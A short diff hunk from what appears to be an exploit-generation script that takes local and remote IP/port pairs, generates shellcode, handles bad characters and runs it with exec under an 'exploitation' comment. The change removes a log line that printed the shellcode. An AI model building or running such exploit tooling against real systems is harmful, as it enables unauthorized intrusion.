@@ -306,8 +306,6 @@ def main(l_ip_port: tuple, r_ip_port: tuple, convention: str = "little", prefix=
             logging_console("Generating shell code..-", "POSITIVE", end="\r")
         time.sleep(0.2)
 
-    logging_console(f"Generated shell code: {shell_code}", "INFO")
-
     # exploitation
     bad_chars = ''.join(bad_chars)
     exec(shell_code)
